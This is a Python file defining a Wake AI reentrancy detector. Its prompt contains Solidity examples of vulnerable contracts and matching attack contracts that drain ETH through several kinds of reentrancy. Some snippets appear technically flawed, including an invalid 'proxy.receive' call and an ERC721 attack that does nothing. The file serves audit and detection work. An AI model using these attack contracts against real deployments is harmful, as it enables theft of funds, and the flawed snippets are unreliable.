"""Reentrancy vulnerability detector using Wake's built-in detection capabilities."""

from wake_ai import workflow
from wake_ai.templates import SimpleDetector

@workflow.command(name="reentrancy")
def factory():
    """Run reentrancy detector."""
    return ReentrancyDetector()


class ReentrancyDetector(SimpleDetector):
    """Enhanced reentrancy detector that leverages Wake's static analysis."""

    def get_detector_prompt(self) -> str:
        """Define the reentrancy detection workflow."""
        return """# Comprehensive Reentrancy Attack Vectors Analysis

## Task
Perform comprehensive analysis of 10 critical reentrancy attack vectors, focusing on all types of reentrancy exploits including basic, cross-contract, recursive, flash loan combinations, and specialized variants.

## Target Attack Vectors

### 🔴 Critical Severity (7 vectors)
1. **Basic Reentrancy Attack**
   - Classic single-function reentrancy
   - External call before state update
   - Check-Effect-Interaction pattern violations
   - Withdrawal function exploitation
   - Balance manipulation attacks

2. **Cross-Contract Reentrancy Attack**
   - Inter-contract reentrancy exploitation
   - Multi-contract state dependencies
   - Shared state corruption
   - Contract interaction vulnerabilities
   - Cross-system reentrancy chains

3. **Recursive Reentrancy Attack**
   - Deep recursive call exploitation
   - Stack depth manipulation
   - Recursive state corruption
   - Multi-level callback attacks
   - Compound recursive effects

4. **Advanced Reentrancy with Flash Loans**
   - Flash loan + reentrancy combinations
   - Temporary liquidity exploitation
   - Multi-step attack sequences
   - Flash loan callback manipulation
   - Leveraged reentrancy attacks

5. **Cross-Function Reentrancy**
   - Function-to-function reentrancy
   - State inconsistency exploitation
   - Multi-function attack vectors
   - Internal function manipulation
   - Cross-function state corruption

6. **Delegated Call Reentrancy**
   - Delegatecall context manipulation
   - Storage layout exploitation
   - Context switching attacks
   - Proxy pattern reentrancy
   - Library function reentrancy

7. **Flash Loan Reentrancy**
   - Flash loan callback reentrancy
   - Temporary state manipulation
   - Liquidity-based reentrancy
   - Multi-protocol flash loan attacks
   - Flash loan oracle manipulation

### 🟡 High Severity (2 vectors)
8. **State-Dependent Reentrancy**
   - State-based reentrancy conditions
   - Conditional reentrancy exploitation
   - State machine manipulation
   - Context-dependent vulnerabilities
   - Complex state reentrancy patterns

9. **ERC721 Reentrancy Attack**
   - NFT-specific reentrancy exploitation
   - Token transfer callback attacks
   - Minting/burning reentrancy
   - NFT marketplace exploitation
   - ERC721 hook manipulation

### 🟠 Medium Severity (1 vector)
10. **View Function Reentrancy**
    - Read-only function exploitation
    - View function callback attacks
    - State reading manipulation
    - Indirect state effects
    - View function side effects

## Analysis Process

### 1. Discovery Phase
- Map external call patterns
- Identify state change sequences
- Locate callback opportunities
- Find inter-contract dependencies
- Analyze function call flows

### 2. Attack Vector Analysis

#### Basic Reentrancy Detection
- Check external calls before state updates
- Analyze withdrawal patterns
- Look for CEI violations
- Test callback possibilities
- Verify balance manipulations

#### Cross-Contract Analysis
- Map inter-contract relationships
- Check shared state dependencies
- Analyze cross-contract calls
- Look for chain vulnerabilities
- Test multi-contract exploitation

#### Advanced Pattern Detection
- Check flash loan integrations
- Analyze delegatecall usage
- Look for recursive patterns
- Test view function effects
- Verify NFT callback vulnerabilities

#### State Dependency Analysis
- Map state-dependent conditions
- Check conditional reentrancy
- Analyze state machine logic
- Look for context dependencies
- Test complex state patterns

### 3. Reentrancy-Specific Exploit Patterns

#### Classic Reentrancy
- External call before balance update
- Withdrawal function exploitation
- Balance drain attacks
- Repeated execution exploitation
- State corruption through callbacks

#### Advanced Reentrancy
- Multi-contract coordination
- Flash loan amplification
- Recursive call exploitation
- Cross-function manipulation
- Delegatecall context attacks

#### Specialized Reentrancy
- Token callback exploitation
- View function side effects
- State-dependent conditions
- Oracle manipulation through reentrancy
- Complex multi-step attacks

## Documentation Requirements

For each reentrancy attack:
- **Attack Type**: Basic, cross-contract, recursive, etc.
- **Entry Point**: Function or callback that enables reentrancy
- **Exploitation Method**: How the attack manipulates contract state
- **State Impact**: What state changes are exploited
- **Call Flow**: Detailed sequence of function calls
- **Proof of Concept**: Concrete attack demonstration
- **Impact Assessment**: Funds at risk and system compromise
- **Remediation**: Specific fixes (reentrancy guards, CEI pattern)

## Validation Criteria
- Test with realistic attack scenarios
- Verify callback mechanisms exist
- Confirm state corruption possibilities
- Account for gas limitations
- Provide concrete exploit demonstrations

## Special Focus Areas

### Basic Reentrancy Attack
```solidity
// Classic reentrancy vulnerability:
contract VulnerableWithdrawal {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // VULNERABLE: External call before state update
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABILITY: External call before state change
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // State update happens after external call
        balances[msg.sender] -= amount;
    }
    
    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }
}

// Basic reentrancy attack:
contract BasicReentrancyAttack {
    VulnerableWithdrawal public target;
    uint256 public attackAmount;
    
    constructor(address _target) {
        target = VulnerableWithdrawal(_target);
    }
    
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        attackAmount = msg.value;
        
        // Step 1: Deposit to establish balance
        target.deposit{value: attackAmount}();
        
        // Step 2: Start reentrancy attack
        target.withdraw(attackAmount);
    }
    
    // This function is called by target.withdraw()
    receive() external payable {
        // Step 3: Reenter if target still has balance
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }
    
    function drain() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

### Cross-Contract Reentrancy Attack
```solidity
// Cross-contract reentrancy vulnerability:
contract VaultA {
    mapping(address => uint256) public balances;
    VaultB public partnerVault;
    
    constructor(address _partnerVault) {
        partnerVault = VaultB(_partnerVault);
    }
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABILITY: External call to partner contract
        partnerVault.notifyWithdrawal(msg.sender, amount);
        
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount;
    }
}

contract VaultB {
    mapping(address => uint256) public balances;
    VaultA public partnerVault;
    
    function setPartner(address _partnerVault) external {
        partnerVault = VaultA(_partnerVault);
    }
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // VULNERABILITY: This can be exploited for cross-contract reentrancy
    function notifyWithdrawal(address user, uint256 amount) external {
        require(msg.sender == address(partnerVault), "Only partner");
        
        // Attacker can reenter here
        if (balances[user] > 0) {
            // Some logic that might call back to VaultA
            partnerVault.withdraw(balances[user]);
        }
    }
    
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount;
    }
}

// Cross-contract reentrancy attack:
contract CrossContractReentrancyAttack {
    VaultA public vaultA;
    VaultB public vaultB;
    
    constructor(address _vaultA, address _vaultB) {
        vaultA = VaultA(_vaultA);
        vaultB = VaultB(_vaultB);
    }
    
    function attack() external payable {
        // Step 1: Deposit in both vaults
        vaultA.deposit{value: msg.value}();
        vaultB.deposit{value: msg.value}();
        
        // Step 2: Trigger cross-contract reentrancy
        vaultA.withdraw(msg.value);
    }
    
    receive() external payable {
        // Exploit cross-contract state inconsistency
        if (address(vaultB).balance > 0) {
            vaultB.withdraw(vaultB.balances(address(this)));
        }
    }
}
```

### Recursive Reentrancy Attack
```solidity
// Deep recursive reentrancy vulnerability:
contract RecursiveVulnerable {
    mapping(address => uint256) public balances;
    uint256 public recursionDepth;
    uint256 public maxDepth = 10;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    function recursiveWithdraw(uint256 amount, uint256 depth) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        require(depth <= maxDepth, "Max depth exceeded");
        
        recursionDepth = depth;
        
        // VULNERABILITY: Recursive external call
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount;
        
        // Allow further recursion
        if (depth < maxDepth) {
            // This enables deep recursive attacks
        }
    }
}

// Recursive reentrancy attack:
contract RecursiveReentrancyAttack {
    RecursiveVulnerable public target;
    uint256 public attackAmount;
    uint256 public currentDepth;
    
    constructor(address _target) {
        target = RecursiveVulnerable(_target);
    }
    
    function attack() external payable {
        attackAmount = msg.value;
        target.deposit{value: attackAmount}();
        target.recursiveWithdraw(attackAmount, 0);
    }
    
    receive() external payable {
        currentDepth++;
        
        // Continue recursive attack until max depth
        if (currentDepth < 10 && address(target).balance >= attackAmount) {
            target.recursiveWithdraw(attackAmount, currentDepth);
        }
    }
}
```

### Advanced Reentrancy with Flash Loans
```solidity
// Flash loan + reentrancy combination attack:
interface IFlashLoanProvider {
    function flashLoan(uint256 amount, bytes calldata data) external;
}

contract FlashLoanReentrancyVulnerable {
    mapping(address => uint256) public balances;
    uint256 public totalDeposited;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        totalDeposited += msg.value;
    }
    
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        require(address(this).balance >= amount, "Insufficient contract balance");
        
        // VULNERABILITY: External call before state update
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount;
        totalDeposited -= amount;
    }
    
    // Function that uses contract balance for calculations
    function calculateReward() external view returns (uint256) {
        return (balances[msg.sender] * address(this).balance) / totalDeposited;
    }
}

// Flash loan + reentrancy attack:
contract FlashLoanReentrancyAttack {
    IFlashLoanProvider public flashLoanProvider;
    FlashLoanReentrancyVulnerable public target;
    uint256 public flashLoanAmount;
    
    constructor(address _provider, address _target) {
        flashLoanProvider = IFlashLoanProvider(_provider);
        target = FlashLoanReentrancyVulnerable(_target);
    }
    
    function attack() external {
        // Step 1: Take large flash loan
        flashLoanAmount = 1000 ether;
        flashLoanProvider.flashLoan(flashLoanAmount, "");
    }
    
    function onFlashLoan(uint256 amount, bytes calldata) external {
        // Step 2: Deposit flash loan funds
        target.deposit{value: amount}();
        
        // Step 3: Start reentrancy attack with inflated balance
        target.withdraw(amount);
        
        // Step 4: Repay flash loan (after draining more through reentrancy)
        payable(msg.sender).transfer(amount);
    }
    
    receive() external payable {
        // Step 5: Reenter with flash loan funds still in contract
        if (address(target).balance > flashLoanAmount) {
            target.withdraw(target.balances(address(this)));
        }
    }
}
```

### Cross-Function Reentrancy
```solidity
// Cross-function reentrancy vulnerability:
contract CrossFunctionVulnerable {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public rewards;
    bool public rewardsEnabled = true;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABILITY: External call before state update
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount;
    }
    
    // VULNERABILITY: Separate function that can be called during reentrancy
    function claimReward() external {
        require(rewardsEnabled, "Rewards disabled");
        require(balances[msg.sender] > 0, "No balance");
        
        uint256 reward = calculateReward(msg.sender);
        rewards[msg.sender] = 0; // Reset reward
        
        (bool success,) = msg.sender.call{value: reward}("");
        require(success, "Reward transfer failed");
    }
    
    function calculateReward(address user) internal view returns (uint256) {
        return balances[user] / 10; // 10% reward
    }
    
    function toggleRewards() external {
        rewardsEnabled = !rewardsEnabled;
    }
}

// Cross-function reentrancy attack:
contract CrossFunctionReentrancyAttack {
    CrossFunctionVulnerable public target;
    bool public inWithdraw;
    
    constructor(address _target) {
        target = CrossFunctionVulnerable(_target);
    }
    
    function attack() external payable {
        // Step 1: Deposit funds
        target.deposit{value: msg.value}();
        
        // Step 2: Start withdrawal attack
        target.withdraw(msg.value);
    }
    
    receive() external payable {
        if (!inWithdraw) {
            inWithdraw = true;
            
            // Step 3: During withdrawal reentrancy, claim rewards
            // This uses the balance that hasn't been updated yet
            target.claimReward();
            
            // Step 4: Continue withdrawal reentrancy
            if (address(target).balance > 0) {
                target.withdraw(target.balances(address(this)));
            }
            
            inWithdraw = false;
        }
    }
}
```

### State-Dependent Reentrancy
```solidity
// State-dependent reentrancy vulnerability:
contract StateDependentVulnerable {
    mapping(address => uint256) public balances;
    mapping(address => bool) public vipStatus;
    enum ContractState { Active, Paused, Maintenance }
    ContractState public currentState = ContractState.Active;
    
    modifier onlyActive() {
        require(currentState == ContractState.Active, "Contract not active");
        _;
    }
    
    function deposit() external payable onlyActive {
        balances[msg.sender] += msg.value;
        
        // Become VIP if depositing large amount
        if (msg.value >= 10 ether) {
            vipStatus[msg.sender] = true;
        }
    }
    
    function withdraw(uint256 amount) external onlyActive {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABILITY: State-dependent reentrancy
        if (vipStatus[msg.sender] && currentState == ContractState.Active) {
            // VIP users get bonus
            uint256 bonus = amount / 20; // 5% bonus
            
            (bool success,) = msg.sender.call{value: amount + bonus}("");
            require(success, "Transfer failed");
            
            balances[msg.sender] -= amount;
        } else {
            (bool success,) = msg.sender.call{value: amount}("");
            require(success, "Transfer failed");
            
            balances[msg.sender] -= amount;
        }
    }
    
    function pauseContract() external {
        currentState = ContractState.Paused;
    }
    
    function resumeContract() external {
        currentState = ContractState.Active;
    }
}

// State-dependent reentrancy attack:
contract StateDependentReentrancyAttack {
    StateDependentVulnerable public target;
    uint256 public attackAmount;
    
    constructor(address _target) {
        target = StateDependentVulnerable(_target);
    }
    
    function attack() external payable {
        require(msg.value >= 10 ether, "Need 10+ ETH for VIP status");
        attackAmount = msg.value;
        
        // Step 1: Deposit to become VIP
        target.deposit{value: attackAmount}();
        
        // Step 2: Start state-dependent reentrancy
        target.withdraw(attackAmount);
    }
    
    receive() external payable {
        // Step 3: Exploit state-dependent conditions
        if (target.vipStatus(address(this)) && 
            target.currentState() == StateDependentVulnerable.ContractState.Active &&
            address(target).balance > attackAmount) {
            
            target.withdraw(target.balances(address(this)));
        }
    }
}
```

### View Function Reentrancy
```solidity
// View function reentrancy vulnerability:
contract ViewFunctionVulnerable {
    mapping(address => uint256) public balances;
    address[] public users;
    
    function deposit() external payable {
        if (balances[msg.sender] == 0) {
            users.push(msg.sender);
        }
        balances[msg.sender] += msg.value;
    }
    
    // VULNERABILITY: View function with external call
    function getUserInfo(address user) external view returns (uint256 balance, bool isActive) {
        balance = balances[user];
        
        // DANGEROUS: External call in view function
        try IERC20(user).totalSupply() returns (uint256) {
            isActive = true;
        } catch {
            isActive = false;
        }
    }
    
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // Check user info during withdrawal
        (uint256 userBalance, bool isActive) = this.getUserInfo(msg.sender);
        require(isActive, "User not active");
        
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount;
    }
}

// View function reentrancy attack:
contract ViewFunctionReentrancyAttack {
    ViewFunctionVulnerable public target;
    bool public inAttack;
    
    constructor(address _target) {
        target = ViewFunctionVulnerable(_target);
    }
    
    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }
    
    // Implement ERC20 interface to trigger view function call
    function totalSupply() external returns (uint256) {
        if (!inAttack && address(target).balance > 0) {
            inAttack = true;
            
            // Step 3: Reenter through view function callback
            target.withdraw(target.balances(address(this)));
            
            inAttack = false;
        }
        return 1000000;
    }
    
    receive() external payable {}
}
```

### Delegated Call Reentrancy
```solidity
// Delegatecall reentrancy vulnerability:
contract ProxyContract {
    address public implementation;
    mapping(address => uint256) public balances;
    
    constructor(address _implementation) {
        implementation = _implementation;
    }
    
    function upgrade(address newImplementation) external {
        implementation = newImplementation;
    }
    
    // VULNERABILITY: Delegatecall with user-controlled data
    function execute(bytes calldata data) external payable {
        (bool success,) = implementation.delegatecall(data);
        require(success, "Delegatecall failed");
    }
    
    receive() external payable {
        balances[msg.sender] += msg.value;
    }
}

contract ImplementationContract {
    mapping(address => uint256) public balances;
    
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABILITY: External call in implementation
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount;
    }
}

// Delegatecall reentrancy attack:
contract DelegatecallReentrancyAttack {
    ProxyContract public proxy;
    ImplementationContract public implementation;
    
    constructor(address _proxy, address _implementation) {
        proxy = ProxyContract(_proxy);
        implementation = ImplementationContract(_implementation);
    }
    
    function attack() external payable {
        // Step 1: Deposit funds
        proxy.receive{value: msg.value}();
        
        // Step 2: Craft delegatecall data
        bytes memory data = abi.encodeWithSignature("withdraw(uint256)", msg.value);
        
        // Step 3: Execute delegatecall reentrancy
        proxy.execute(data);
    }
    
    receive() external payable {
        // Step 4: Reenter through delegatecall context
        if (address(proxy).balance > 0) {
            bytes memory data = abi.encodeWithSignature(
                "withdraw(uint256)", 
                proxy.balances(address(this))
            );
            proxy.execute(data);
        }
    }
}
```

### Flash Loan Reentrancy
```solidity
// Flash loan specific reentrancy:
contract FlashLoanVulnerable {
    mapping(address => uint256) public balances;
    uint256 public flashLoanFee = 100; // 1%
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    function flashLoan(uint256 amount, bytes calldata data) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Insufficient liquidity");
        
        // VULNERABILITY: External call in flash loan
        (bool success,) = msg.sender.call{value: amount}(data);
        require(success, "Flash loan callback failed");
        
        uint256 fee = (amount * flashLoanFee) / 10000;
        require(address(this).balance >= balanceBefore + fee, "Flash loan not repaid");
    }
    
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount;
    }
}

// Flash loan reentrancy attack:
contract FlashLoanReentrancyAttack {
    FlashLoanVulnerable public target;
    
    constructor(address _target) {
        target = FlashLoanVulnerable(_target);
    }
    
    function attack() external payable {
        target.deposit{value: msg.value}();
        
        // Step 1: Take flash loan to trigger reentrancy
        target.flashLoan(msg.value, abi.encode("attack"));
    }
    
    fallback() external payable {
        // Step 2: During flash loan callback, withdraw deposited funds
        if (target.balances(address(this)) > 0) {
            target.withdraw(target.balances(address(this)));
        }
        
        // Step 3: Return flash loan funds
        uint256 fee = (msg.value * 100) / 10000;
        payable(msg.sender).transfer(msg.value + fee);
    }
    
    receive() external payable {}
}
```

### ERC721 Reentrancy Attack
```solidity
// NFT reentrancy vulnerability:
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract NFTMarketplace {
    mapping(uint256 => uint256) public tokenPrices;
    mapping(uint256 => address) public tokenSellers;
    mapping(address => uint256) public balances;
    
    IERC721 public nftContract;
    
    constructor(address _nftContract) {
        nftContract = IERC721(_nftContract);
    }
    
    function listToken(uint256 tokenId, uint256 price) external {
        require(nftContract.ownerOf(tokenId) == msg.sender, "Not token owner");
        
        nftContract.transferFrom(msg.sender, address(this), tokenId);
        
        tokenPrices[tokenId] = price;
        tokenSellers[tokenId] = msg.sender;
    }
    
    function buyToken(uint256 tokenId) external payable {
        require(tokenPrices[tokenId] > 0, "Token not for sale");
        require(msg.value >= tokenPrices[tokenId], "Insufficient payment");
        
        address seller = tokenSellers[tokenId];
        uint256 price = tokenPrices[tokenId];
        
        // Reset state
        tokenPrices[tokenId] = 0;
        tokenSellers[tokenId] = address(0);
        
        // VULNERABILITY: External call (NFT transfer) before balance update
        nftContract.transferFrom(address(this), msg.sender, tokenId);
        
        // Update balances after external call
        balances[seller] += price;
        
        if (msg.value > price) {
            balances[msg.sender] += msg.value - price;
        }
    }
    
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        
        balances[msg.sender] = 0;
        
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}

// ERC721 reentrancy attack:
contract ERC721ReentrancyAttack is IERC721Receiver {
    NFTMarketplace public marketplace;
    IERC721 public nftContract;
    uint256 public attackTokenId;
    bool public inAttack;
    
    constructor(address _marketplace, address _nftContract) {
        marketplace = NFTMarketplace(_marketplace);
        nftContract = IERC721(_nftContract);
    }
    
    function attack(uint256 tokenId) external payable {
        attackTokenId = tokenId;
        
        // Step 1: Buy the NFT to trigger reentrancy
        marketplace.buyToken{value: msg.value}(tokenId);
    }
    
    // ERC721 callback - called during transferFrom
    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        if (!inAttack && tokenId == attackTokenId) {
            inAttack = true;
            
            // Step 2: Reenter during NFT transfer
            // At this point, the marketplace thinks the sale is complete
            // but seller's balance hasn't been updated yet
            
            // We can manipulate the marketplace state here
            // For example, buy another token or withdraw funds
            
            inAttack = false;
        }
        
        return IERC721Receiver.onERC721Received.selector;
    }
    
    receive() external payable {}
}
```

Focus on identifying all types of reentrancy vulnerabilities including callback-based attacks, state manipulation through external calls, and complex multi-step reentrancy scenarios. Pay special attention to the interaction between different contract functions and the timing of state updates relative to external calls."""